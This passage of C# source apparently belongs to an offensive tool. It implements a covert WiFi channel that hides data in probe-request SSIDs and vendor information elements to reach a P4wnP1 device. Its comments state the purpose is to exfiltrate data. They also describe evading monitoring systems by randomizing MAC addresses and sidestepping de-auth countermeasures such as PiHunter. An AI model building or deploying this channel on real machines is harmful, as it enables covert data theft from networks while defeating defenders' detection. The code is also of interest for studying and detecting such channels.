            IntPtr pIeData, //not for XP SP2 or earlier + not neccesarily supported by driver
            IntPtr pReserved);

        [DllImport("wlanapi.dll")]
        public static extern int WlanGetNetworkBssList(
            [In] IntPtr clientHandle,
            ref Guid pInterfaceGuid,
            [In] IntPtr dot11SsidInt,
            [In] Dot11BssType dot11BssType,
            [In] bool securityEnabled,
            IntPtr reservedPtr,
            [Out] out IntPtr wlanBssList
        );


        /*
         * Interop part for handling notification callbacks (e.g. WlanScan has finished)
         */

        [Flags]
        public enum WlanNotificationSource
        {
            None = 0,
            All = 0X0000FFFF,
            ACM = 0X00000008,
            MSM = 0X00000010,
            Security = 0X00000020,
            IHV = 0X00000040
        }

        public enum WlanNotificationCodeAcm
        {
            AutoconfEnabled = 1,
            AutoconfDisabled,
            BackgroundScanEnabled,
            BackgroundScanDisabled,
            BssTypeChange,
            PowerSettingChange,
            ScanComplete,
            ScanFail,
            ConnectionStart,
            ConnectionComplete,
            ConnectionAttemptFail,
            FilterListChange,
            InterfaceArrival,
            InterfaceRemoval,
            ProfileChange,
            ProfileNameChange,
            ProfilesExhausted,
            NetworkNotAvailable,
            NetworkAvailable,
            Disconnecting,
            Disconnected,
            AdhocNetworkStateChange
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct WlanNotificationData
        {
            public WlanNotificationSource notificationSource;
            public int notificationCode;
            public Guid interfaceGuid;
            public int dataSize;
            public IntPtr dataPtr;
        }


        public delegate void WlanNotificationCallbackDelegate(ref WlanNotificationData notificationData, IntPtr context);

        [DllImport("wlanapi.dll")]
        public static extern int WlanRegisterNotification(
            [In] IntPtr clientHandle,
            [In] WlanNotificationSource notifSource,
            [In] bool ignoreDuplicate,
            [In] WlanNotificationCallbackDelegate funcCallback,
            [In] IntPtr callbackContext,
            [In] IntPtr reserved,
            [Out] out WlanNotificationSource prevNotifSource);


        /*
         * Methods
         */
        public static byte[] simpleChecksum16(byte[] input, int len = -1)
        {
            UInt16 sum = 0;
            int off=0;

            if (len == -1) len = input.Length; //Calculate for full array


            for (off = 0; off < len; off++)
            {
                sum += input[off];
                sum %= 0xFFFF;
            }

            sum = (UInt16) ~sum; 

            byte[] res = new byte[2];
            res[0] = (byte) ((sum & 0xFF00) >>8);
            res[1] = (byte) (sum & 0x00FF);
            return res;
        }

        
        public static IntPtr openNativeWifiHandle(uint desiredVersion=CL_VER_GT_XP)
        {
            IntPtr handle = IntPtr.Zero;
            uint negotiatedVersion;
            WlanOpenHandle(desiredVersion, IntPtr.Zero, out negotiatedVersion, out handle);

            if (desiredVersion != negotiatedVersion) return IntPtr.Zero; //Not what we wanted
            return handle;
        }

        public static void closeNativeWifiHandle(IntPtr handle)
        {
            WlanCloseHandle(handle, IntPtr.Zero);
        }

        public static Packet[] SendRecv(IntPtr clientHandle, Guid interface_guid, Packet outpacket, bool block = true)
        {
            bool useCustomIe = true; //adds a vendor define IE to exfiltrate 238 additional bytes of data
            List<Packet> result = new List<Packet>();

            //useCustomIe = outpacket.FlagIncludedVenIe;
            useCustomIe = outpacket.ie_vendor_payload != null;


            /*
             * Sending part
             * According to https://msdn.microsoft.com/en-us/library/windows/desktop/ms706783(v=vs.85).aspx
             * "...The driver may or may not send probe requests (an active scan) depending on its implementation and the values passed in the pDot11Ssid and pIeData parameters..."
             * 
             * This means the upstream channel is only working if the driver is willing.
             * An alternative would be to use the Connect function, instead of scan, to force probing for a custom SSID.
             * BUT THIS WOULD INTERRUPT CURRENT WIFI CONNECTIONS!
             * 
             * pleData is currently unused, but could add additional 240 bytes to the custom probe (DOT11_PSD_IE_MAX_DATA_SIZE = 240).
             * using only the SSID ie we're stuck at 32 bytes per transmitted probe request, but more compatibility is achieved.
             * 
             * Remember: This is only a PoC !!!
             * 
             */

            //Generate SSID out of sendbuf
            DOT11_SSID ssid = new DOT11_SSID();
            ssid.uSSIDLength = Packet.SSID_RAW_LEN;
            //ssid.ucSSID = outpacket.ssid_raw_data;
            ssid.ucSSID = outpacket.generateRawSsid();

            //Convert to C-Struct + ptr
            IntPtr pSsid = Marshal.AllocHGlobal(Marshal.SizeOf(ssid));
            Marshal.StructureToPtr(ssid, pSsid, true);


            if (useCustomIe)
            {


                //ToDo: Everything handed in to pIeData gets send unmodified (a valid TLV IE has to be build by hand)
                RAW_IE_DATA ieData = new RAW_IE_DATA();
                ieData.dataBlob = outpacket.generateRawVenIe(true);
                ieData.dwDataSize = (uint) ieData.dataBlob.Length; 
                
                //Convert to c struct and retrieve pointer
                IntPtr pIeData = Marshal.AllocHGlobal(Marshal.SizeOf(ieData));
                Marshal.StructureToPtr(ieData, pIeData, true);

                WlanScan(clientHandle, ref interface_guid, pSsid, pIeData, IntPtr.Zero);
            }
            else
            {
                WlanScan(clientHandle, ref interface_guid, pSsid, IntPtr.Zero, IntPtr.Zero);
            }
            Marshal.FreeHGlobal(pSsid);

            /*
             * Receiving part
             */

            if (block) waitScanComplete.WaitOne();

            //Retrieve BSS List (update from scan at some time)
            IntPtr scan_res = new IntPtr();
            WlanGetNetworkBssList(clientHandle, ref interface_guid, IntPtr.Zero, Dot11BssType.Any, false, IntPtr.Zero, out scan_res);

            //Convert result to WlanBSSListHeader struct + multiple WlanBSSEntry structs
            WlanBssListHeader bssListHeader = (WlanBssListHeader)Marshal.PtrToStructure(scan_res, typeof(WlanBssListHeader));
            long bssListPtr = scan_res.ToInt64() + Marshal.SizeOf(typeof(WlanBssListHeader));
            WlanBssEntry[] bssEntries = new WlanBssEntry[bssListHeader.numberOfItems];
            //            int validSizeCount = 0;

            if (bssListHeader.numberOfItems == 0) return null;

            for (int i = 0; i < bssListHeader.numberOfItems; ++i)
            {
                byte[] in_ssid = null;
                byte[] in_sa = null;
                byte[] in_ie_vendor = null;
                uint in_ssid_len = 0;
                


                bssEntries[i] = (WlanBssEntry)Marshal.PtrToStructure(new IntPtr(bssListPtr), typeof(WlanBssEntry)); //Convert data at current bssListPtr to WlanBssEntry struct
                //calculate pointer to IeData for current BSS_ENTRY
                IntPtr pIeData = new IntPtr(bssListPtr + bssEntries[i].ieOffset.ToInt64());

                //Read and store probed SSID
                in_ssid_len = bssEntries[i].dot11Ssid.uSSIDLength;
                in_ssid = bssEntries[i].dot11Ssid.ucSSID;

                //Read, convert and store probing BSSID
                in_sa = bssEntries[i].dot11Bssid;


                //extract vendor IE (type = 221) if present
                in_ie_vendor = extractIe(221, pIeData, bssEntries[i].ieSize);

                if (!Packet.filterLengthChecksum(in_ssid, in_ie_vendor))
                {
                    //Console.WriteLine(String.Format("Packet dropped in filter, BSSID {0} SSID {1}", ethaddr2str(in_sa), System.Text.Encoding.ASCII.GetString(in_ssid)));
                    bssListPtr += Marshal.SizeOf(typeof(WlanBssEntry)); //advance bssListPtr by sizeof(WlanBssEntry) struct
                    continue; //skip invalid packets
                }

                
                Packet packet = Packet.parse2packet(in_sa, new byte[6], in_ssid, in_ie_vendor);
                result.Add(packet);
                
                bssListPtr += Marshal.SizeOf(typeof(WlanBssEntry)); //advance bssListPtr by sizeof(WlanBssEntry) struct
            }

            return result.ToArray();
        }

        public static byte[] extractIe(byte searched_ie_type, IntPtr pIeData, uint lenIeData)
        {
            byte[] result = null;
            int pos = 0;
            byte ie_len = 0;
            byte ie_type = 0;
            

            if (lenIeData < 2) return result; //no valid IEs present

            while (pos < (lenIeData - 2))
            {
                //read type + length of current ie
                ie_type = Marshal.ReadByte(pIeData, pos);
                pos++;
                ie_len = Marshal.ReadByte(pIeData, pos);
                pos++;

                //check if searched type
                if (ie_type == searched_ie_type)
                {
                    result = new byte[ie_len];
                    Marshal.Copy(new IntPtr(pIeData.ToInt64() + pos), result, 0, ie_len);

                    //We're done with the loop if we have a hit
                    break;
                }
                pos += ie_len; //advance ptr to next IE
            }
            return result;
        }

        public static WlanInterfaceInfo[] enumInterfaces(IntPtr nativeWifiHandle)
        {
            IntPtr pIfaceList;
            WlanEnumInterfaces(nativeWifiHandle, IntPtr.Zero, out pIfaceList);

            //Recreate WLAN_INTERFACE_INFO[] structures
            WlanInterfaceInfoListHeader iflh = (WlanInterfaceInfoListHeader)Marshal.PtrToStructure(pIfaceList, typeof(WlanInterfaceInfoListHeader)); //convert struct pointed to to InterfaceInfoListHeader (only first two elements)
            WlanInterfaceInfo[] ifi = new WlanInterfaceInfo[iflh.numberOfItems];
            Int64 ptrVal = pIfaceList.ToInt64() + Marshal.SizeOf(iflh); //Offset pointer value beyond two header fields (First WLAN_INTERFACE_INFO entry)
            for (int i = 0; i < iflh.numberOfItems; i++)
            {
                ifi[i] = (WlanInterfaceInfo)Marshal.PtrToStructure(new IntPtr(ptrVal), typeof(WlanInterfaceInfo));
                ptrVal += Marshal.SizeOf(ifi[i]);
            }

            return ifi;
        }


        static void OnACMNotification(ref WlanNotificationData notifyData, IntPtr context)
        {
            
            switch ((WlanNotificationCodeAcm)notifyData.notificationCode)
            {
#if DEBUG
                case WlanNotificationCodeAcm.ConnectionStart:
                case WlanNotificationCodeAcm.ConnectionComplete:
                case WlanNotificationCodeAcm.ConnectionAttemptFail:
                case WlanNotificationCodeAcm.Disconnecting:
                case WlanNotificationCodeAcm.Disconnected:
                    break;
#endif
                case WlanNotificationCodeAcm.ScanFail:
#if DEBUG
                    Console.WriteLine("Scan failed!");
#endif
                    waitScanComplete.Set();
                    break;
                case WlanNotificationCodeAcm.ScanComplete:
#if DEBUG
                    Console.WriteLine("Scan completed!");
#endif
                    waitScanComplete.Set();
                    break;
#if DEBUG
                case WlanNotificationCodeAcm.NetworkAvailable:
                    Console.WriteLine("Network Available!");
                    break;
                case WlanNotificationCodeAcm.NetworkNotAvailable:
                    Console.WriteLine("Network NOT Available!");
                    break;
                case WlanNotificationCodeAcm.ProfilesExhausted:
                    Console.WriteLine("Profiles exhausted!");
                    break;
#endif
            }

        }

        
     
        /*

        public static void init_connection(IntPtr clientHandle, Guid interface_guid)
        {
                      
        }
        */
#if DEBUG
        [DllImport("kernel32")]
        static extern bool AllocConsole();
#endif

        public static String test()
        {
#if DEBUG
            AllocConsole();

            Console.WriteLine("Starting test");
#endif
            String res = "";

            IntPtr handle = openNativeWifiHandle();
            if (handle == IntPtr.Zero) return "No valid handle for native WiFi API received";

            try
            {
                WlanNotificationSource prevSrc;
                WlanRegisterNotification(handle, WlanNotificationSource.ACM, false, OnACMNotification, IntPtr.Zero, IntPtr.Zero, out prevSrc);
            }
            catch
            {
                return "Error registering for Notifications";
                throw;
            }


            //Enumerate interfaces
            WlanInterfaceInfo[] ifi = enumInterfaces(handle);
            
            //Go on if there's at least one WiFi interface
            if (ifi.Length > 0)
            {
                //ToDo: Ignore stale interfaces

                //use first available interface
                Guid g_if = ifi[0].interfaceGuid;

                WiFiSocket wsock = new WiFiSocket();
                bool conres = wsock.Connect(handle, g_if);
                if (conres) Console.WriteLine(String.Format("Connection established\nMTU: {0}\nClientID: {1}", wsock.MTU, wsock.clientID));


                /*
                 * - only one channel per client
                 * - client identified by SA (could change during scan, e.g. apple) --> Failover to payload based identifier needed
                 * - MTU depends on usability of Vendor IE in each direction, which should be tested on connection init
                 * - transfer rate client --> server depends on scan speed (new scan only if old one is finished)
                 * ---> native wifi api doesn't allow scanning for multiple SSIDs at once, could be improved with new Win10 API
                 * - packet transmission, transmit order and uniqeness aren't guarantied at low layer for now (UDP like)
                 * - covert channel data is distinguished from noise with 16 bit checksums (one for SSID and one for Vendor IE)
                 * - source MAC of server could vary (isn't used in covert channel data validation), this could be used to randomize
                 * the server's source mac (=bssid and SA), e.g. to prevent alerts from monitoring systems which react on changing
                 * SSIDs for the same BSSID
                 * - it should be noted, that the covert channel isn't impacted by active counter meassures based on
                 * on detection of multiple SSIDs for the same AP bssid (for instance PiHunter would start sending de-auths when
                 * this kind of management frames is spotted). This wouldn't affect the covert channel, because it isn't based on
                 * authentication or association, but on purew PROBE REQUEST/RESPONSE. Due to this fact, a de-auth would do nothing.
                 * To be more precise, the P4wnP1 end would even ignore the de-auth, as it only reacts on probe requests.
                 * 
                 */

            }

            closeNativeWifiHandle(handle);

            return res;
        }
        
    }
}
